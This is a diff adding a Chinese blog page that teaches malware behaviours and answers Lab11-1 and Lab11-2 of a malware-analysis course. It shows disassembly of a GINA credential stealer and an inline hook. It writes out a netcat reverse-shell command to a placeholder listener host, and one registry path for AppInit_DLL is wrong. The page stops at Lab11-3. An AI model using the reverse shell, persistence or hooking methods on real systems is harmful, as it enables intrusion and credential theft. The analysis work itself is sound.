@@ -1,0 +1,643 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="
+知识点本章中会介绍恶意代码常见的恶意行为，方便我们识别各种各样的恶意程序。
+下载器和启动器：常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行，通常使用WindowsAPI函数URLDownloadtoFileA和WinExec，来下载并运行新的恶意代码。启动器也成为加载器，是一类可执行文件，用来安装立即运行或者将来运行的恶意代码。
+后门：后门可以让攻击">
+  <meta name="author" content="Hvnt3r">
+  <meta name="keywords" content="CTF, WEB安全, 二进制安全">
+  
+  <title>恶意代码行为 - Hvnt3r&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/xcode.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.hvnt3r.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Hvnt3r</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="恶意代码行为">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-03-20 11:08" pubdate>
+        2019年3月20日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      71
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">恶意代码行为</h1>
+            
+            <div class="markdown-body">
+              <hr>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本章中会介绍恶意代码常见的恶意行为，方便我们识别各种各样的恶意程序。</p>
+<p><strong>下载器和启动器：</strong>常见的两种恶意代码是下载器和启动器。下载器从互联网上下载其他的恶意代码，然后在本地系统中运行，通常使用<code>WindowsAPI</code>函数<code>URLDownloadtoFileA</code>和<code>WinExec</code>，来下载并运行新的恶意代码。启动器也成为加载器，是一类可执行文件，用来安装立即运行或者将来运行的恶意代码。</p>
+<p><strong>后门：</strong>后门可以让攻击者远程访问一个受害的机器。通常使用80端口的HTTP协议与控制机器进行通信。</p>
+<span id="more"></span>
+
+<p><strong>反向Shell：</strong>反向Shell是从受害者主机发起的向攻击者连接，为攻击者提供被感染机器的访问权限，一般有如下反向弹Shell的方式：</p>
+<ul>
+<li>NetCat：网络瑞士军刀，可以通过命令<code>nc listener_ip 80 -e cmd.exe</code>来弹Shell。</li>
+<li>Windows反向Shell：使用<code>cmd.exe</code>作为反向Shell，首先创建一个套接字并于远程服务器简历连接。然后绑定这个套接字与<code>cmd.exe</code>的标准流再调用<code>CreateProcess</code>函数用隐藏窗口的方式创建cmd.exe。也可以使用多线程方式：使用<code>CreatPipe</code>来绑定一个通道的读写端，如标准输入标准输出，<code>CreateProcess</code>函数用来绑定一个管道与标准流，而不是直接与套接字绑定。调用<code>CreateProcess</code>方法，恶意代码会产生两个线程，一个用来从标准输入管道读取数据，并向套接字写数据，另外一个用来从一个套接字读数据，并向一个标准管道中写数据。通常这两个线程使用数据编码来混淆数据。</li>
+</ul>
+<p><strong>远程控制工具：</strong>远程控制工具RAT能被用来管理一台或者多台计算机。远程控制工具进场为了特定目标，如窃取信息或者旁路一个网络执行针对性的攻击。</p>
+<p><strong>僵尸网络：</strong>僵尸网络是被感染主机的一个集合。他们由单一实体控制，其目标同行是为了进行DDoS攻击。</p>
+<p><strong>登陆凭证窃密器：</strong>攻击者通常使用以下三种方法进行登陆凭证的窃取：</p>
+<ul>
+<li>等待用户登陆以窃取登陆凭证</li>
+<li>击键记录器</li>
+<li>转储Windows系统中存放的信息，如密码hash值，程序直接使用它或者对它进行离线爆破。</li>
+</ul>
+<p><strong>特殊注册表：</strong>恶意代码编写者可以通过一个名为<code>AppInit_DLL</code>特殊注册表项来让他们的DLL得到加载，此注册表项中的DLL程序回在进程加载<code>User32.dll</code>时被加载，<code>AppInit_DLL</code>位置如下：</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost<br></code></pre></td></tr></table></figure>
+
+<p>恶意代码编写者可以挂钩一个特殊的<code>Winlogon Notify</code>事件，如登陆、注销、关机、锁屏等，这些甚至允许恶意代码再安全模式下加载，以下注册表键中的注册表项包含Notify值：</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\<br></code></pre></td></tr></table></figure>
+
+<p><code>Windows</code>所有的服务都存在与注册表中，恶意代码经常作为一个服务安装，安装的恶意代码作为<code>svchost.exe</code>的DLL来存活，这使得恶意代码可以与其他进程混淆，更像一个标准的服务。<code>svchost.exe</code>时从动态链接库中运行服务的通用主机进程，<code>Windows</code>操作系统通常用以时刻运行多个<code>svchost.exe</code>实例，每个实例包含一组服务，这些组定义子啊下列的注册表位置：</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost<br></code></pre></td></tr></table></figure>
+
+<p>服务被定义在如下位置：</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName<br></code></pre></td></tr></table></figure>
+
+<p><strong>特洛伊木马化（Trojanized）系统二进制文件：</strong>此技术可以直接修改系统的二进制文件，当被感染的二进制文件运行或加载时，将会强制运行恶意代码，恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码，这些修改补丁覆盖函数的开始代码或者覆盖其他的一些并不影响特洛伊木马化DLL正常操作的代码，为了不影响二进制文件的正常操作，恶意代码经常被加到一个可执行文件的空节中，插入的代码并不关心他被插入到感染的DLL的位置。加载恶意代码后，为了让DLL的操作与插入前的一致，代码会跳转回原始的DLL程序。</p>
+<p><strong>DLL加载顺序劫持：</strong>这是一种简单而隐蔽的指数，它允许恶意代码编写者再不适用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序，这种技术甚至不需要单独的恶意加载器。以下是再Windows XP中加载DLL的默认搜索顺序：</p>
+<ul>
+<li>加载应用程序的目录</li>
+<li>当前目录</li>
+<li>系统目录（使用<code>GetSystemDirectory</code>函数获取的路径）</li>
+<li>16位子系统的系统目录</li>
+<li>Windows目录</li>
+<li>PATH环境变量中列出的目录</li>
+</ul>
+<p>在<code>WindowsXP</code>中利用<code>KnownDLL</code>注册表键可以跳过DLL的加载过程，这注册表键保护一些特定的DLL位置列表。DLL加载顺序劫持可以被<code>System32</code>之外的目录中的二进制文件利用，来加载未被<code>KnownDLL</code>保护的DLL程序。由于DLL递归导入的原因，很多DLL会在加载其他的DLL，而这些DLL按照默顺序加载，因此<code>KnownDLL</code>机制也不能得到充分的保护。</p>
+<p><strong>提权：</strong>多数提权攻击时利用本地系统已知漏洞或者0Day漏洞进行攻击。DLL加载顺序劫持也可以被用来进行提权操作，加入恶意DLL所在的目录是用户可写的，并且加载这个DLL的进程在一个高特权级上运行，那么DLL就获得了提权。</p>
+<p><strong>使用SeDebugPrivilege进行提权：</strong>在Windows系统中，访问令牌是一个包含进程安全描述符的对象，安全描述符用来指定拥有者的访问权限，SeDebugPrivilege特权作为一个系统级别调试的工具被创建，默认情况下，SeDebugPrivilege只赋给本地系统账户权限。普通的用户账号不能给自身赋予SeDebugPrivilege权限。</p>
+<p><strong>IAT Hook：</strong>这是一种在用户空间中很常见的Rootkit方法，它隐藏本地系统中的文件、进程以及网络连接，这种Hook方法修改导入地址表（IAT）或者导出地址表（EAT）从而改变程序的执行流程，但是这种方法很容易被检测出来。</p>
+<p><strong>Inline Hook：</strong>这种方法使用过覆盖导入DLL中的API函数的代码来实现的，所以它必须等到DLL被加载后才能执行。IAT Hook知识简单的修改函数指针，但是Inline Hook将修改实际的函数代码。恶意Rootkit通常使用一个跳转指令替换函数的开始代码来执行Inline Hook，这个跳转指令使Rootkit插入的恶意代码获取执行，另外Rootkit还可以通过改变函数的代码来破坏它或者改变它，而不是跳转到恶意代码。</p>
+<h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab11-1"><a href="#Lab11-1" class="headerlink" title="Lab11-1"></a>Lab11-1</h3><p><strong>分析恶意代码Lab11-01.exe</strong></p>
+<p><strong>问题</strong></p>
+<p><strong>1.这个恶意代码项磁盘释放了什么？</strong></p>
+<p>通过静态分析，在004010C9位置发现如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:004010B8                 mov     eax, lpType<br>.text:004010BD                 push    eax             ; lpType<br>.text:004010BE                 mov     ecx, lpName<br>.text:004010C4                 push    ecx             ; lpName<br>.text:004010C5                 mov     edx, [ebp+hModule]<br>.text:004010C8                 push    edx             ; hModule<br>.text:004010C9                 call    ds:FindResourceA<br>.text:004010CF                 mov     [ebp+hResInfo], eax<br>.text:004010D2                 cmp     [ebp+hResInfo], 0<br>.text:004010D6                 jnz     short loc_4010DF<br>.text:004010D8                 xor     eax, eax<br>.text:004010DA                 jmp     loc_4011BF<br>.text:004010DF ; ---------------------------------------------------------------------------<br>.text:004010DF<br>.text:004010DF loc_4010DF:                             ; CODE XREF: sub_401080+56↑j<br>.text:004010DF                 mov     eax, [ebp+hResInfo]<br>.text:004010E2                 push    eax             ; hResInfo<br>.text:004010E3                 mov     ecx, [ebp+hModule]<br>.text:004010E6                 push    ecx             ; hModule<br>.text:004010E7                 call    ds:LoadResource<br>.text:004010ED                 mov     [ebp+hResData], eax<br>.text:004010F0                 cmp     [ebp+hResData], 0<br>.text:004010F4                 jnz     short loc_4010FB<br>.text:004010F6                 jmp     loc_4011A5<br>.text:004010FB ; ---------------------------------------------------------------------------<br>.text:004010FB<br>.text:004010FB loc_4010FB:                             ; CODE XREF: sub_401080+74↑j<br>.text:004010FB                 mov     edx, [ebp+hResData]<br>.text:004010FE                 push    edx             ; hResData<br>.text:004010FF                 call    ds:LockResource<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/03/21/5c92e2d4b1d97.png" srcset="/img/loading.gif" lazyload></p>
+<p>在资源节发现了名为TGAD的节，程序对此节进行了二进制资源的提取。</p>
+<p><img src="https://i.loli.net/2019/03/21/5c92e4d4113dd.png" srcset="/img/loading.gif" lazyload></p>
+<p>因此程序在磁盘上释放的文件是从资源节中提取出来的数据存储为<code>msgina32.dll</code>。</p>
+<p><strong>2.这个恶意代码如何进行驻留？</strong></p>
+<p>根据如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401004                 push    0               ; lpdwDisposition<br>.text:00401006                 lea     eax, [ebp+phkResult]<br>.text:00401009                 push    eax             ; phkResult<br>.text:0040100A                 push    0               ; lpSecurityAttributes<br>.text:0040100C                 push    0F003Fh         ; samDesired<br>.text:00401011                 push    0               ; dwOptions<br>.text:00401013                 push    0               ; lpClass<br>.text:00401015                 push    0               ; Reserved<br>.text:00401017                 push    offset SubKey   ; &quot;SOFTWARE\\Microsoft\\Windows NT\\Curren&quot;...<br>.text:0040101C                 push    80000002h       ; hKey<br>.text:00401021                 call    ds:RegCreateKeyExA<br>.text:00401027                 test    eax, eax<br>.text:00401029                 jz      short loc_401032<br>.text:0040102B                 mov     eax, 1<br>.text:00401030                 jmp     short loc_40107B<br>.text:00401032                 mov     ecx, [ebp+cbData]<br>.text:00401035                 push    ecx             ; cbData<br>.text:00401036                 mov     edx, [ebp+lpData]<br>.text:00401039                 push    edx             ; lpData<br>.text:0040103A                 push    1               ; dwType<br>.text:0040103C                 push    0               ; Reserved<br>.text:0040103E                 push    offset ValueName ; &quot;GinaDLL&quot;<br>.text:00401043                 mov     eax, [ebp+phkResult]<br>.text:00401046                 push    eax             ; hKey<br>.text:00401047                 call    ds:RegSetValueExA<br>.text:0040104D                 test    eax, eax<br>.text:0040104F                 jz      short loc_401062<br>.text:00401051                 mov     ecx, [ebp+phkResult]<br>.text:00401054                 push    ecx             ; hObject<br>.text:00401055                 call    ds:CloseHandle<br></code></pre></td></tr></table></figure>
+
+<p>得知恶意代码写入注册表项<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>并设置了值<code>GinaDLL</code>。</p>
+<p><strong>3.这个恶意代码如何窃取用户登陆凭证？</strong></p>
+<p>在msgina32.dll文件的导出函数中发现了大量的以<code>Wlx</code>开头的函数名：</p>
+<p><img src="https://i.loli.net/2019/03/21/5c933c2f74f97.png" srcset="/img/loading.gif" lazyload></p>
+<p>这些函数都会调用函数<code>sub_10001000()</code>，此函数会直接将调用函数的名称用<code>GetProcAddress</code>函数在<code>msgina.dll</code>文件中查找此函数的地址并将执行流程交给目标函数，目标函数执行完成之后又会返回到恶意程序中，<code>msgina32.dll</code>中的大部分<code>Wlx</code>开头的函数都是这个结构，但是在函数<code>WlxLoggedOutSAS</code>中却不一样，在<code>WlxLoggedOutSAS</code>中调用了函数<code>sub_10001570()</code>向文件<code>msutil32.sys</code>存储了用户凭证的数据。</p>
+<p><strong>4.这个恶意代码对窃取的证书做了什么处理？</strong></p>
+<p>通过查看<code>10001570</code>处代码找到程序将窃取的证书存储在了一个名为<code>msutil32.sys</code>的文件中。</p>
+<p><strong>5.如何在你的测试环境让这个恶意代码获得用户登陆凭证？</strong></p>
+<p>函数<code>WlxLoggedOutSAS</code>的调用发生在用户注销时，因此我们注销重启后就能看到用户登陆凭证。</p>
+<h3 id="Lab11-2"><a href="#Lab11-2" class="headerlink" title="Lab11-2"></a>Lab11-2</h3><p><strong>分析恶意代码Lab11-02.dll。假设一个名为Lab11-02.ini的可疑文件与这个恶意代码一同被发现。</strong></p>
+<p><strong>问题</strong></p>
+<p><strong>1.这个恶意DLL导出了什么？</strong></p>
+<p>这个DLL有两个导出函数：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Name</span>	Address	Ordinal<br><span class="hljs-attribute">installer</span>	<span class="hljs-number">1000158</span>B	<span class="hljs-number">1</span><br><span class="hljs-attribute">DllEntryPoint</span>	<span class="hljs-number">100017</span>E9<span class="hljs-meta">	[main entry]</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>2.使用rundll32.exe安装这个恶意代码之后，发生了什么？</strong></p>
+<p>使用命令</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">rundll32<span class="hljs-selector-class">.exe</span> Lab11_02<span class="hljs-selector-class">.dll</span>, installer<br></code></pre></td></tr></table></figure>
+
+<p>程序会在<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>写入自身，并且将<code>spoolvxx32.dll</code>写入到系统目录中。</p>
+<p><strong>3.为了使这个恶意代码正确安装，Lab11-02.ini必须被放置在何处？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:1000166F                 push    0               ; hTemplateFile<br>.text:10001671                 push    80h             ; dwFlagsAndAttributes<br>.text:10001676                 push    3               ; dwCreationDisposition<br>.text:10001678                 push    0               ; lpSecurityAttributes<br>.text:1000167A                 push    1               ; dwShareMode<br>.text:1000167C                 push    80000000h       ; dwDesiredAccess<br>.text:10001681                 mov     eax, [ebp+Dest]<br>.text:10001684                 push    eax             ; lpFileName<br>.text:10001685                 call    ds:CreateFileA<br></code></pre></td></tr></table></figure>
+
+<p>此处程序会尝试访问系统目录下的<code>Lab11-02.ini</code>文件，如果此文件存在则继续执行，否则退出，因此我们需要将<code>Lab11-02.ini</code>放在系统目录下。</p>
+<p><strong>4.这个安装的恶意代码如何驻留？</strong></p>
+<p>通过在注册表<code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code>中添加<code>spoolvxx32.dll</code>。</p>
+<p><strong>5.这个恶意代码采用的用户态Rootkit技术是什么？</strong></p>
+<p>Inline Hook</p>
+<p><strong>6.挂钩代码做了什么？</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:10001203                 push    ebp<br>.text:10001204                 mov     ebp, esp<br>.text:10001206                 sub     esp, 0Ch<br>.text:10001209                 mov     eax, [ebp+arg_4]<br>.text:1000120C                 sub     eax, [ebp+lpAddress]<br>.text:1000120F                 sub     eax, 5<br>.text:10001212                 mov     [ebp+var_4], eax<br>.text:10001215                 lea     ecx, [ebp+flOldProtect]<br>.text:10001218                 push    ecx             ; lpflOldProtect<br>.text:10001219                 push    40h             ; flNewProtect<br>.text:1000121B                 push    5               ; dwSize<br>.text:1000121D                 mov     edx, [ebp+lpAddress]<br>.text:10001220                 push    edx             ; lpAddress<br>.text:10001221                 call    ds:VirtualProtect<br>.text:10001227                 push    0FFh            ; Size<br>.text:1000122C                 call    malloc<br>.text:10001231                 add     esp, 4<br>.text:10001234                 mov     [ebp+var_8], eax<br>.text:10001237                 mov     eax, [ebp+var_8]<br>.text:1000123A                 mov     ecx, [ebp+lpAddress]<br>.text:1000123D                 mov     [eax], ecx<br>.text:1000123F                 mov     edx, [ebp+var_8]<br>.text:10001242                 mov     byte ptr [edx+4], 5<br>.text:10001246                 push    5               ; Size<br>.text:10001248                 mov     eax, [ebp+lpAddress]<br>.text:1000124B                 push    eax             ; Src<br>.text:1000124C                 mov     ecx, [ebp+var_8]<br>.text:1000124F                 add     ecx, 5<br>.text:10001252                 push    ecx             ; Dst<br>.text:10001253                 call    memcpy<br>.text:10001258                 add     esp, 0Ch<br>.text:1000125B                 mov     edx, [ebp+var_8]<br>.text:1000125E                 mov     byte ptr [edx+0Ah], 0E9h<br>.text:10001262                 mov     eax, [ebp+lpAddress]<br>.text:10001265                 sub     eax, [ebp+var_8]<br>.text:10001268                 sub     eax, 0Ah<br>.text:1000126B                 mov     ecx, [ebp+var_8]<br>.text:1000126E                 mov     [ecx+0Bh], eax<br>.text:10001271                 mov     edx, [ebp+lpAddress]<br>.text:10001274                 mov     byte ptr [edx], 0E9h<br>.text:10001277                 mov     eax, [ebp+lpAddress]<br>.text:1000127A                 mov     ecx, [ebp+var_4]<br>.text:1000127D                 mov     [eax+1], ecx<br>.text:10001280                 lea     edx, [ebp+flOldProtect]<br>.text:10001283                 push    edx             ; lpflOldProtect<br>.text:10001284                 mov     eax, [ebp+flOldProtect]<br>.text:10001287                 push    eax             ; flNewProtect<br>.text:10001288                 push    5               ; dwSize<br>.text:1000128A                 mov     ecx, [ebp+lpAddress]<br>.text:1000128D                 push    ecx             ; lpAddress<br>.text:1000128E                 call    ds:VirtualProtect<br>.text:10001294                 mov     edx, [ebp+var_8]<br>.text:10001297                 add     edx, 5<br>.text:1000129A                 mov     eax, [ebp+arg_8]<br>.text:1000129D                 mov     [eax], edx<br>.text:1000129F                 mov     esp, ebp<br>.text:100012A1                 pop     ebp<br>.text:100012A2                 retn<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>7.哪个文件或者哪些进程执行这个恶意攻击。为什么？</strong></p>
+<p>程序会对比当前进程名是否与<code>THEBAT.EXE</code>、<code>OUTLOOK.EXE</code>、<code>MSIMN.EXE</code>其中的任意一个相同，如果相同则运行恶意代码，否则退出。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(Buf1, aThebatExe_0, v2)      <span class="hljs-comment">// THEBAT.EXE</span><br>        || (v3 = <span class="hljs-built_in">strlen</span>(aOutlookExe), !<span class="hljs-built_in">memcmp</span>(Buf1, aOutlookExe_0, v3))<span class="hljs-comment">// OUTLOOK.EXE</span><br>        || (v4 = <span class="hljs-built_in">strlen</span>(aMsimnExe), !<span class="hljs-built_in">memcmp</span>(Buf1, aMsimnExe_0, v4)) )<span class="hljs-comment">// MSIMN.EXE</span><br>      &#123;<br>        Proc_thread_sub_100013BD();<br>        sub_100012A3(ModuleName, aSend, sub_1000113D, &amp;dword_10003484);<br>        sub_10001499();<br>      &#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>8.<code>.ini</code>文件的意义是什么？</strong></p>
+<p>代码读取<code>.ini</code>文件中的数据，通过函数<code>sub_100010B3</code>进行解密得出一个邮箱地址<code>billy@malwareanalysisbook.com</code>。</p>
+<p><strong>9.你怎样使用WireShark动态抓取这个恶意代码的行为？</strong></p>
+<p>打开<code>WireShark</code>并用<code>outlook</code>发送邮件。</p>
+<h3 id="Lab11-3"><a href="#Lab11-3" class="headerlink" title="Lab11-3"></a>Lab11-3</h3><p><strong>分析恶意代码Lab11-03.exe和Lab11-03.dll。确保这两个文件在分析时位于同一个目录中。</strong></p>
+<p><strong>问题</strong></p>
+<p><strong>1.使用基础的静态分析过程，你可以发现什么有趣的线索？</strong></p>
